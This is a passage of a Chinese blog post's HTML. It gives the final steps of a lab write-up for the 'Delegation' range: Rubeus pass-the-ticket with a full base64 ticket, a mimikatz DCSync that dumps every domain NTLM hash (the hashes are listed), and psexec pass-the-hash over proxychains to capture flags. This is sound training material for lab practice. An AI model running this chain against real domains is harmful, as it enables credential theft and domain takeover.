+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6Gu8cmnn/yivAbsIBGb083yJDB6dJRODHP1bjAfZvoz1YoZnroLlPjLrdCWRsj6+UL1JS+ZwTD5uUIrULi8ofZ+7vTw/ZJ3jDupn7VZM8vvgAcQnVurgK98Cj9jAdCm+Fy0kAIgWN/aWuw12x+lJ8t3O2B7esYh+mYQsLrqMqE+B5ORHxHU7SyLM9j8Ky11/rGPDjr72z6VewAFXVYEQo7+oaMQ84l/4BBGJVHXhlMQxrGJxnwiLw/X4chMEQ4rM8JQnxRggbhSg5TltT4g0QpTRjgp54OczjYJptkiGmAFOXGRSFNTjf460t+3w03rw9x8Gfyde3pYNYNktDCmEYrPq+4r8UlUTS5YOHr7pPogblzN57sLbYXbsGRdgAY/HzEqhcETSvi4qQ/jZU/59uS62oYrvjsEpAinAniyndHWp+hVD50OWcaCRwJGd1Q3XoQ9g1VqkkEa2k2aKh7cBxHw6uAG4Q1aKsNb9TyyZz/als1pUe6VFKWaGLjedwXKxYpF2fNbbR4OazHG+E3jNXJ5rSu2UKqr6r8wisfd52cqBx8BpPRZc+yf5EULPIbj7cLVnS0vp6Uvrc13AURc6s5NkUMFiMc+rXwUTF+bOouW5PjBApEIh/cT3XCg2Ems22K2jeJ9pRU9ZqccuOheGRu4gjPYEjpl48BZFJ0YNvQseUCs8plYZ7iOGh3pbq/ij/ImnEUe7RYLu3oEgMt5yjK4ptNGAxuH3I35dWKCDZ4692tH4W1sbx2yXYwVh2V7afMyFsIYsSmwDnUBGBB1KJY2Nq7XTu2cjWcXlEe1MtYuCdXGPc1mUBrjLOKfWlpAOowp9HgMyES6euks6uRRpugaCd9exWCNXTQ3HxgrXSXoJ9g3sT4wKBObqiY4RNWhImPC9bOTwCqR5LdKdTAPxwQyIFM5T14QmOpyrmeXmo0Ci+Q0Fm0w4NEZ0fi5zOxiKlbYMKKUgHsEDb6u90mXpdUYggfARpAnPPjzpbHA6AufTMhWSOpAwaXySzd6hEFBQfiZr79W0k/K4pCDMCrrN7IeM908XKGFmkt7b0Ti10xIX2dbfd7Oz5Kj8iSiLendtS8hXdu3j8Foxyigzaq78q03LH6adLVT8M7H/H5L2Yyj0pK8t7lgW8ruqnG9fCcEFvZF3riZ61Z7lOc1Ih0jPdbRxbxPNvEJ5cy81Z1rCMXlpsNikvdn3gyZcVMrQV0v6r5tpKbjXTWNzvuts7SCEhJQ1LAcWqTXnLmuOYTOIr5TOQ4laW0MYCmM4WzoizzgqF6B/GBBlaKjFq6sYs5WvrDrpU4oPSqWunEQYWqzv8WDQgpS6t4W1AI2YG5IEe5RcGS2rGGoYwALS+9ZxVh2QsGu2NPXGFb3BIj1nEFOdoqLzFW8TxqpHt3QuYLWb0UJWw0mbGCT7VRjmjLGBlBqbA86U0FZLjC8UmT54CUkwujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCB12JvSkVI2yZgL857MedYXsBT+jZdt4RTe3dXQIjh1raEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDExMzA4NTEwNFqmERgPMjAyNDAxMTMxODUxMDRapxEYDzIwMjQwMTIwMDg1MTA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181014104-1162979587.png" alt="image-20240113173022070"></p>
+<p>因为dc拥有dcsync的权限，所以直接可以获取域内所有的hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181014824-1843991263.png" alt="image-20240113172951500"></p>
+<p>成功拿到域管hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   2aac0ab080878616924dee8d48190458        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     26eb4211fb2769c980125e4a432c7498        4096</span><br><span class="line">1104    WIN19$  4017dab3eeaf981160632f84bbf00f73        528384</span><br></pre></td></tr></table></figure>
+
+<p>连接dc，拿到flag04</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python psexec.py xiaorang/Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181015756-533365461.png" alt="image-20240113173309120"></p>
+<p>再回过来连接172.22.4.19，拿到flag03</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python psexec.py xiaorang/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/07/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20Delegation%20WP/3144128-20240113181016721-1183614587.png" alt="image-20240113173522999"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="wuyaxiao 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="wuyaxiao 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%97%A0%E9%99%90%E8%BF%9B%E8%A1%8C%E6%97%B6/" rel="tag"># 无限进行时</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/01/14/%E8%A5%BF%E7%93%9C%E6%9D%AF/" rel="prev" title="西瓜杯">
+      <i class="fa fa-chevron-left"></i> 西瓜杯
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+            
+    
+  
+
+  <!-- 应使用 elif 而不是 else if -->  
+  <div class="comments" id="comments">  
+    
+  <script src="https://utteranc.es/client.js"
+    repo="wuyaxiao/wuyaxiao.github.io"
+    issue-term="title"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+  </div>  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation-WP"><span class="nav-number">1.</span> <span class="nav-text">春秋云境 Delegation WP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag01"><span class="nav-number">2.</span> <span class="nav-text">flag01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag02"><span class="nav-number">3.</span> <span class="nav-text">flag02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag03%E5%92%8Cflag04"><span class="nav-number">4.</span> <span class="nav-text">flag03和flag04</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyaxiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="fa fa-user">
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyaxiao</span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
